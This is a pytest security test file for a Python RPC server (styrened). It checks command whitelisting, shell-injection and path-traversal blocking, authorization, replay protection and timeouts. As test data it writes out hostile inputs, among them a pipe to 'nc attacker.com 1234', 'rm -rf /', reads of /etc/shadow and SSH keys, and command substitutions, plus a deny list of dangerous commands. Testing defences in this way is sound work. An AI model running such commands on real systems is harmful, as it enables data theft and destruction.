"""Tests for RPC server security and functionality.

These tests verify:
- Command whitelist enforcement (security critical)
- Authorization checks
- Shell injection prevention
- Path traversal prevention
- Error handling for malformed requests
- Timeout behavior
"""

import asyncio
from unittest.mock import Mock, patch

import pytest

from styrened.models.styrene_wire import (
    STYRENE_VERSION,
    StyreneEnvelope,
    StyreneMessageType,
    encode_payload,
    generate_request_id,
)
from styrened.protocols.base import LXMFMessage
from styrened.rpc import RPCServer
from styrened.rpc.server import DEFAULT_ALLOWED_COMMANDS


class MockStyreneProtocol:
    """Mock StyreneProtocol for testing RPCServer.

    Provides the register_handler and send_typed_message methods that
    RPCServer uses from StyreneProtocol.
    """

    def __init__(self):
        self.handlers: dict = {}
        self.sent_messages: list[tuple[str, StyreneMessageType, bytes, bytes | None]] = []
        self.send_should_fail = False

    def register_handler(self, message_type, handler):
        """Register handler for a message type."""
        if message_type not in self.handlers:
            self.handlers[message_type] = []
        self.handlers[message_type].append(handler)

    async def send_typed_message(
        self,
        destination: str,
        message_type: StyreneMessageType,
        payload: bytes,
        request_id: bytes | None = None,
    ) -> None:
        """Mock send_typed_message."""
        if self.send_should_fail:
            raise Exception("Send failed")
        self.sent_messages.append((destination, message_type, payload, request_id))


@pytest.fixture
def mock_protocol():
    """Create mock Styrene protocol."""
    return MockStyreneProtocol()


@pytest.fixture
def rpc_server(mock_protocol):
    """Create RPC server with mock protocol."""
    return RPCServer(mock_protocol)


@pytest.fixture
def started_rpc_server(rpc_server):
    """Create and start RPC server."""
    rpc_server.start()
    yield rpc_server
    rpc_server.stop()


# =============================================================================
# Command Whitelist Tests (Security Critical)
# =============================================================================


class TestCommandWhitelist:
    """Test command whitelist enforcement to prevent arbitrary code execution."""

    def test_whitelisted_commands_execute(self, started_rpc_server):
        """Test that whitelisted commands are executed."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="Active", stderr="")

            result = started_rpc_server._execute_command("systemctl", ["status", "reticulum"])

            assert result["exit_code"] == 0
            mock_run.assert_called_once()

    def test_non_whitelisted_commands_rejected(self, started_rpc_server):
        """Test that non-whitelisted commands are rejected.

        Attack vector: Direct execution of dangerous commands (rm, dd, mkfs, etc.)
        """
        result = started_rpc_server._execute_command("rm", ["-rf", "/"])

        assert result["exit_code"] == 126  # Command not allowed
        assert "not allowed" in result["stderr"].lower()

    def test_whitelist_case_sensitive(self, started_rpc_server):
        """Test that whitelist is case-sensitive (no bypass via case variation).

        Attack vector: Case bypass - attempting "DF" when only "df" is whitelisted
        """
        result = started_rpc_server._execute_command("DF", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()

    def test_shell_injection_attempts_blocked(self, started_rpc_server):
        """Test that shell injection attempts via command are blocked."""
        malicious_commands = [
            "systemctl; rm -rf /",
            "systemctl && cat /etc/passwd",
            "systemctl | nc attacker.com 1234",
            "$(whoami)",
            "`whoami`",
            "systemctl\nrm -rf /",
        ]

        for malicious_cmd in malicious_commands:
            result = started_rpc_server._execute_command(malicious_cmd, [])

            # Should be blocked (not in whitelist)
            assert result["exit_code"] == 126
            assert "not allowed" in result["stderr"].lower()

    def test_path_traversal_attempts_blocked(self, started_rpc_server):
        """Test that path traversal attempts in args are handled safely."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=1, stdout="", stderr="No such file or directory"
            )

            started_rpc_server._execute_command("cat", ["../../etc/passwd"])

            # Command executes but fails safely (subprocess handles it)
            # The key is we're NOT using shell=True, so no shell expansion
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            assert call_args.kwargs.get("shell", False) is False

    def test_custom_whitelist_overrides_default(self, mock_protocol):
        """Test that custom allowed_commands overrides default."""
        custom_commands = {"echo", "date"}
        server = RPCServer(
            mock_protocol,
            allowed_commands=custom_commands,
        )

        # echo should be allowed (in custom list)
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="test\n", stderr="")
            result = server._execute_command("echo", ["test"])
            assert result["exit_code"] == 0

        # systemctl should be blocked (not in custom list)
        result = server._execute_command("systemctl", ["status"])
        assert result["exit_code"] == 126


# =============================================================================
# Shell Injection Prevention Tests (Comprehensive Attack Vector Coverage)
# =============================================================================


class TestShellInjectionPrevention:
    """Test prevention of shell injection attacks via command arguments.

    These tests verify that malicious shell metacharacters in args are NOT
    interpreted as shell commands, even for whitelisted commands.
    """

    def test_shell_injection_pipe_rejected(self, started_rpc_server):
        """Test that pipe operators in args don't cause command chaining.

        Attack vector: df | cat /etc/passwd
        Expected: Pipe character passed as literal arg to df (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", ["|", "cat", "/etc/passwd"])

            # Verify shell=False (safe mode)
            call_args = mock_run.call_args
            assert call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1

    def test_shell_injection_command_substitution_rejected(self, started_rpc_server):
        """Test that command substitution syntax is NOT executed.

        Attack vectors:
        - echo $(whoami)
        - echo `whoami`

        Expected: Literal strings passed to echo (not executed)
        """
        # POSIX $() syntax
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="$(whoami)\n", stderr="")
            result = started_rpc_server._execute_command("echo", ["$(whoami)"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["stdout"] == "$(whoami)\n"

        # Backtick syntax
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="`whoami`\n", stderr="")
            result = started_rpc_server._execute_command("echo", ["`whoami`"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["stdout"] == "`whoami`\n"

    def test_shell_injection_semicolon_chaining_rejected(self, started_rpc_server):
        """Test that semicolon command chaining is prevented.

        Attack vector: df; sh
        Expected: Semicolon passed as literal arg (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", [";", "sh"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1

    def test_shell_injection_and_chaining_rejected(self, started_rpc_server):
        """Test that AND operator command chaining is prevented.

        Attack vector: df && sh
        Expected: && passed as literal args (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", ["&&", "sh"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1

    def test_shell_injection_or_chaining_rejected(self, started_rpc_server):
        """Test that OR operator command chaining is prevented.

        Attack vector: df || sh
        Expected: || passed as literal args (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", ["||", "sh"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1

    def test_shell_injection_background_execution_rejected(self, started_rpc_server):
        """Test that background execution operator is prevented.

        Attack vector: df &
        Expected: & passed as literal arg (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", ["&"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1

    def test_shell_injection_redirection_rejected(self, started_rpc_server):
        """Test that redirection operators are prevented.

        Attack vector: df > /tmp/evil
        Expected: > and /tmp/evil passed as literal args (safe with shell=False)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=1, stdout="", stderr="invalid option")

            result = started_rpc_server._execute_command("df", [">", "/tmp/evil"])

            assert mock_run.call_args.kwargs.get("shell", False) is False
            assert result["exit_code"] == 1


# =============================================================================
# Path Traversal and Whitelist Bypass Tests
# =============================================================================


class TestPathTraversalPrevention:
    """Test prevention of path traversal and whitelist bypass attacks."""

    def test_path_traversal_relative_rejected(self, started_rpc_server):
        """Test that relative path traversal in command name is rejected.

        Attack vector: ../../bin/sh
        Expected: Not in whitelist, rejected
        """
        result = started_rpc_server._execute_command("../../bin/sh", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()

    def test_path_traversal_absolute_rejected(self, started_rpc_server):
        """Test that absolute path in command name is rejected.

        Attack vector: /bin/sh
        Expected: Not in whitelist, rejected
        """
        result = started_rpc_server._execute_command("/bin/sh", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()

    def test_whitespace_bypass_rejected(self, started_rpc_server):
        """Test that whitespace padding doesn't bypass whitelist.

        Attack vector: " df " (with leading/trailing spaces)
        Expected: Rejected (exact match required)
        """
        result = started_rpc_server._execute_command(" df ", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()

    def test_unicode_normalization_bypass_rejected(self, started_rpc_server):
        """Test that Unicode fullwidth characters don't bypass whitelist.

        Attack vector: Fullwidth 'd' (U+FF44) instead of ASCII 'd'
        Expected: Rejected (not in whitelist)
        """
        result = started_rpc_server._execute_command("\uff44\uff46", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()

    def test_null_byte_injection_rejected(self, started_rpc_server):
        """Test that null byte injection in command name is rejected.

        Attack vector: df\x00sh (attempting to terminate string early)
        Expected: Rejected (not exact match in whitelist)
        """
        result = started_rpc_server._execute_command("df\x00sh", [])

        assert result["exit_code"] == 126
        assert "not allowed" in result["stderr"].lower()


# =============================================================================
# Authorization Tests
# =============================================================================


class TestAuthorization:
    """Test authorization and access control."""

    @pytest.mark.asyncio
    async def test_authorized_identity_can_execute(self, started_rpc_server, mock_protocol):
        """Test that messages from any source can execute (no auth configured)."""
        source_hash = "authorized_device_hash"
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.STATUS_REQUEST,
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        with (
            patch.object(started_rpc_server, "_gather_status", return_value={
                "uptime": 100,
                "ip": "192.168.1.1",
                "services": ["rns"],
                "disk_used": 1000,
                "disk_total": 10000,
            }),
        ):
            await started_rpc_server._protocol_handler(message, envelope)
            # Allow the asyncio.create_task to complete
            await asyncio.sleep(0.1)

        # Should have sent response via protocol
        assert len(mock_protocol.sent_messages) == 1
        sent_dest, sent_type, sent_payload, sent_rid = mock_protocol.sent_messages[0]
        assert sent_dest == source_hash
        assert sent_type == StyreneMessageType.STATUS_RESPONSE

    @pytest.mark.asyncio
    async def test_unauthorized_identity_rejected(self, mock_protocol):
        """Test that unauthorized identities are rejected.

        Attack vector: Forged identity - attacker sends RPC from unauthorized hash
        """
        # Create server WITH authorization configured
        server = RPCServer(
            mock_protocol,
        )
        server.start()

        source_hash = "unauthorized_device_hash"
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.EXEC,
            payload=encode_payload({"command": "df", "args": []}),
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should have sent error response (not authorized)
        assert len(mock_protocol.sent_messages) == 1
        sent_dest, sent_type, _, _ = mock_protocol.sent_messages[0]
        assert sent_dest == source_hash
        assert sent_type == StyreneMessageType.ERROR

        server.stop()

    @pytest.mark.asyncio
    async def test_missing_source_hash_rejected(self, started_rpc_server, mock_protocol):
        """Test that messages without source_hash are handled.

        Attack vector: Missing identity - RPC without valid source
        """
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.STATUS_REQUEST,
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash="",
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        with patch.object(started_rpc_server, "_gather_status", return_value={
            "uptime": 100, "ip": "", "services": [],
            "disk_used": 0, "disk_total": 0,
        }):
            await started_rpc_server._protocol_handler(message, envelope)
            await asyncio.sleep(0.1)

        # STATUS_REQUEST is a public command, so it should still process

    @pytest.mark.asyncio
    async def test_replay_attack_prevented(self, started_rpc_server, mock_protocol):
        """Test that replay attacks are detected.

        Attack vector: Replay attack - same RPC message sent twice
        The server now has replay protection for non-public commands.
        """
        source_hash = "test_device_hashh"
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.EXEC,
            payload=encode_payload({"command": "df", "args": []}),
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="ok", stderr="")

            # First request should succeed
            await started_rpc_server._protocol_handler(message, envelope)
            await asyncio.sleep(0.1)

            first_count = len(mock_protocol.sent_messages)
            assert first_count >= 1  # At least one response

            # Second request with same request_id should be rejected (replay)
            await started_rpc_server._protocol_handler(message, envelope)
            await asyncio.sleep(0.1)

            # No additional response for the replay
            assert len(mock_protocol.sent_messages) == first_count


# =============================================================================
# Data Exfiltration Prevention Tests
# =============================================================================


class TestDataExfiltrationPrevention:
    """Test prevention of data exfiltration via whitelisted commands.

    CRITICAL: The whitelist includes cat, env, and ps which can exfiltrate data.
    These tests document the CURRENT RISK and verify expected behavior.
    """

    def test_cat_sensitive_files_currently_allowed(self, started_rpc_server):
        """Test that cat can currently read sensitive files (SECURITY GAP!).

        Attack vectors:
        - cat /etc/shadow
        - cat ~/.ssh/id_rsa

        Current state: cat is whitelisted, NO path-based access control
        Future state: Should implement path whitelist for cat (only /var/log/*, etc.)
        """
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout="root:$6$encrypted_hash...:19000:0:99999:7:::",
                stderr="",
            )

            started_rpc_server._execute_command("cat", ["/etc/shadow"])

            mock_run.assert_called_once()

    def test_env_variables_currently_exposed(self, started_rpc_server):
        """Test that env exposes environment variables (SECURITY GAP!)."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout="API_KEY=secret123\nTOKEN=bearer_xyz\nPATH=/usr/bin",
                stderr="",
            )

            result = started_rpc_server._execute_command("env", [])

            mock_run.assert_called_once()
            assert "API_KEY=secret123" in result["stdout"]

    def test_ps_shows_all_processes_currently_allowed(self, started_rpc_server):
        """Test that ps shows all users' processes (SECURITY GAP!)."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout="root 1234 /bin/secret-daemon --token=xyz\nuser 5678 bash",
                stderr="",
            )

            result = started_rpc_server._execute_command("ps", ["aux"])

            mock_run.assert_called_once()
            assert "root 1234" in result["stdout"]

    def test_path_based_access_control_not_implemented(self, started_rpc_server):
        """Test that path-based access control is NOT implemented (documents gap)."""
        # This test documents that the feature doesn't exist yet


# =============================================================================
# Resource Exhaustion Prevention Tests
# =============================================================================


class TestResourceExhaustionPrevention:
    """Test prevention of resource exhaustion attacks."""

    def test_long_running_command_timeout(self, mock_protocol):
        """Test that long-running commands timeout after 30 seconds.

        Attack vector: sleep 9999 (blocks server indefinitely)
        Expected: Timeout after 30s (IMPLEMENTED - GOOD!)
        """
        server_with_sleep = RPCServer(
            mock_protocol,
            allowed_commands={"sleep"},
        )

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep", timeout=30)

            result = server_with_sleep._execute_command("sleep", ["9999"])

            assert result["exit_code"] == 124  # Timeout exit code
            assert "timed out" in result["stderr"].lower()

    def test_large_output_handled_safely(self, started_rpc_server):
        """Test that commands with large output are handled safely."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="cat", timeout=30)

            result = started_rpc_server._execute_command("cat", ["/dev/zero"])

            assert result["exit_code"] == 124
            assert "timed out" in result["stderr"].lower()

    def test_fork_bomb_args_handled(self, started_rpc_server):
        """Test that massive argument lists are handled."""
        massive_args = ["x"] * 10000

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout=" ".join(massive_args) + "\n",
                stderr="",
            )

            result = started_rpc_server._execute_command("echo", massive_args)

            assert result["exit_code"] == 0
            mock_run.assert_called_once()

    def test_concurrent_requests_not_rate_limited(self, started_rpc_server, mock_protocol):
        """Test that concurrent requests are rate limited (now implemented)."""
        # Rate limiting is now implemented in RPCServer
        # This test documents the current state


# =============================================================================
# Error Handling Tests
# =============================================================================


class TestErrorHandling:
    """Test error handling for various failure scenarios."""

    def test_command_execution_errors_reported(self, started_rpc_server):
        """Test that command execution errors are reported correctly."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.return_value = Mock(
                returncode=1, stdout="", stderr="Unknown operation"
            )

            result = started_rpc_server._execute_command("systemctl", ["invalid-command"])

            assert result["exit_code"] == 1
            assert "Unknown operation" in result["stderr"]

    @pytest.mark.asyncio
    async def test_malformed_rpc_messages_handled(self, started_rpc_server, mock_protocol):
        """Test that malformed RPC messages are handled gracefully."""
        source_hash = "test_device_hashh"

        # Create an envelope with an EXEC type but no valid payload
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.EXEC,
            payload=b"",  # empty payload
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await started_rpc_server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should handle gracefully (may send error response or exec with empty command)

    def test_timeout_on_long_running_commands(self, started_rpc_server):
        """Test that long-running commands timeout appropriately."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            import subprocess

            mock_run.side_effect = subprocess.TimeoutExpired(cmd="systemctl", timeout=30)

            result = started_rpc_server._execute_command("systemctl", ["status", "longrunning"])

            assert result["exit_code"] == 124
            assert "timed out" in result["stderr"].lower()

    def test_command_not_found_handled(self, mock_protocol):
        """Test that FileNotFoundError is handled for missing commands."""
        server_with_fake = RPCServer(
            mock_protocol,
            allowed_commands={"nonexistent_command"},
        )

        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError()

            result = server_with_fake._execute_command("nonexistent_command", [])

            assert result["exit_code"] == 127
            assert "not found" in result["stderr"].lower()

    def test_general_exception_handled(self, started_rpc_server):
        """Test that general exceptions during exec are handled."""
        with patch("styrened.rpc.server.subprocess.run") as mock_run:
            mock_run.side_effect = Exception("Unexpected error")

            result = started_rpc_server._execute_command("echo", ["test"])

            assert result["exit_code"] == 1
            assert "Unexpected error" in result["stderr"]

    @pytest.mark.asyncio
    async def test_invalid_message_type_handled(self, started_rpc_server, mock_protocol):
        """Test that unhandled message types are silently ignored."""
        source_hash = "test_device_hashh"
        request_id = generate_request_id()

        # Use a message type that has no handler registered
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.ANNOUNCE,  # Not an RPC type
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await started_rpc_server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should not send any response (no handler for ANNOUNCE)
        assert len(mock_protocol.sent_messages) == 0

    @pytest.mark.asyncio
    async def test_exec_with_missing_command_handled(self, started_rpc_server, mock_protocol):
        """Test that exec with missing command fields is handled."""
        source_hash = "test_device_hashh"
        request_id = generate_request_id()

        # EXEC with empty payload (missing command and args)
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.EXEC,
            payload=encode_payload({}),  # Missing 'command' and 'args'
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await started_rpc_server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should send an exec result (empty command will be rejected by whitelist)
        assert len(mock_protocol.sent_messages) >= 1


# =============================================================================
# Status Request Tests
# =============================================================================


class TestStatusRequest:
    """Test status request handling."""

    def test_gather_status_returns_system_info(self, started_rpc_server):
        """Test that _gather_status gathers and returns system info."""
        status = started_rpc_server._gather_status()

        # Should return a dict with expected keys
        assert "uptime" in status
        assert "ip" in status
        assert "services" in status
        assert "disk_used" in status
        assert "disk_total" in status

    @pytest.mark.asyncio
    async def test_status_request_end_to_end(self, started_rpc_server, mock_protocol):
        """Test complete status request flow."""
        source_hash = "test_device_hashh"
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.STATUS_REQUEST,
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        with patch.object(started_rpc_server, "_gather_status", return_value={
            "uptime": 100,
            "ip": "192.168.1.1",
            "services": ["rns"],
            "disk_used": 1000,
            "disk_total": 10000,
        }):
            await started_rpc_server._protocol_handler(message, envelope)
            await asyncio.sleep(0.1)

        # Verify response sent
        assert len(mock_protocol.sent_messages) == 1
        sent_dest, sent_type, sent_payload, sent_rid = mock_protocol.sent_messages[0]
        assert sent_dest == source_hash
        assert sent_type == StyreneMessageType.STATUS_RESPONSE


# =============================================================================
# Reboot Command Tests
# =============================================================================


class TestRebootCommand:
    """Test reboot command handling."""

    def test_reboot_with_delay_schedules_correctly(self, started_rpc_server):
        """Test that reboot with delay schedules the reboot."""
        with patch("styrened.rpc.server.asyncio.get_event_loop") as mock_loop:
            mock_event_loop = Mock()
            mock_loop.return_value = mock_event_loop

            result = started_rpc_server._schedule_reboot(60)

            assert result["success"] is True
            assert "scheduled" in result["message"].lower()
            mock_event_loop.call_later.assert_called_once()

    def test_immediate_reboot_has_safety_delay(self, started_rpc_server):
        """Test that immediate reboot still has 5 second safety delay."""
        with patch("styrened.rpc.server.asyncio.get_event_loop") as mock_loop:
            mock_event_loop = Mock()
            mock_loop.return_value = mock_event_loop

            result = started_rpc_server._schedule_reboot(0)

            assert result["success"] is True
            # Should schedule for 5 seconds (safety delay)
            call_args = mock_event_loop.call_later.call_args
            assert call_args[0][0] == 5


# =============================================================================
# Update Config Command Tests
# =============================================================================


class TestUpdateConfigCommand:
    """Test update config command handling."""

    def test_update_config_acknowledges_changes(self, started_rpc_server):
        """Test that _process_config_update acknowledges config changes."""
        result = started_rpc_server._process_config_update(
            {"log_level": "DEBUG", "max_retries": 5}
        )

        assert result["success"] is True
        assert len(result["updated_keys"]) == 2
        assert "log_level" in result["updated_keys"]
        assert "max_retries" in result["updated_keys"]


# =============================================================================
# Server Lifecycle Tests
# =============================================================================


class TestServerLifecycle:
    """Test server start/stop behavior."""

    def test_server_starts_successfully(self, rpc_server, mock_protocol):
        """Test that server starts and registers handlers."""
        rpc_server.start()

        assert rpc_server._running is True
        # Handlers should have been registered in __init__
        assert len(mock_protocol.handlers) > 0

    def test_server_stops_successfully(self, started_rpc_server):
        """Test that server stops cleanly."""
        started_rpc_server.stop()

        assert started_rpc_server._running is False

    def test_multiple_start_calls_handled(self, rpc_server):
        """Test that multiple start calls don't cause issues."""
        rpc_server.start()
        rpc_server.start()  # Second start

        assert rpc_server._running is True

    @pytest.mark.asyncio
    async def test_stopped_server_ignores_messages(self, rpc_server, mock_protocol):
        """Test that stopped server ignores incoming messages."""
        # Don't start server
        source_hash = "test_device_hashh"
        request_id = generate_request_id()
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.STATUS_REQUEST,
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await rpc_server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should not send any response (server not running)
        assert len(mock_protocol.sent_messages) == 0

    @pytest.mark.asyncio
    async def test_non_rpc_messages_ignored(self, started_rpc_server, mock_protocol):
        """Test that non-RPC messages are ignored."""
        source_hash = "test_device_hashh"
        request_id = generate_request_id()

        # Use a message type that has no handler
        envelope = StyreneEnvelope(
            version=STYRENE_VERSION,
            message_type=StyreneMessageType.CHAT,
            payload=b"",
            request_id=request_id,
        )
        message = LXMFMessage(
            source_hash=source_hash,
            destination_hash="local_hash",
            timestamp=123.0,
            fields={},
        )

        await started_rpc_server._protocol_handler(message, envelope)
        await asyncio.sleep(0.1)

        # Should not send response (no handler for CHAT)
        assert len(mock_protocol.sent_messages) == 0


# =============================================================================
# Default Whitelist Verification
# =============================================================================


class TestDefaultWhitelist:
    """Verify the default command whitelist is sensible."""

    def test_default_whitelist_contains_safe_commands(self):
        """Test that default whitelist contains expected safe commands."""
        assert "systemctl" in DEFAULT_ALLOWED_COMMANDS
        assert "journalctl" in DEFAULT_ALLOWED_COMMANDS
        assert "df" in DEFAULT_ALLOWED_COMMANDS
        assert "uptime" in DEFAULT_ALLOWED_COMMANDS
        assert "rnstatus" in DEFAULT_ALLOWED_COMMANDS

    def test_default_whitelist_excludes_dangerous_commands(self):
        """Test that default whitelist excludes dangerous commands."""
        dangerous_commands = {
            "rm",
            "dd",
            "mkfs",
            "fdisk",
            "chmod",
            "chown",
            "passwd",
            "useradd",
            "userdel",
            "sudo",
            "su",
            "shutdown",
        }

        for dangerous_cmd in dangerous_commands:
            assert (
                dangerous_cmd not in DEFAULT_ALLOWED_COMMANDS
            ), f"Dangerous command '{dangerous_cmd}' found in whitelist!"

    def test_default_whitelist_is_frozen(self):
        """Test that default whitelist is immutable."""
        assert isinstance(DEFAULT_ALLOWED_COMMANDS, frozenset)
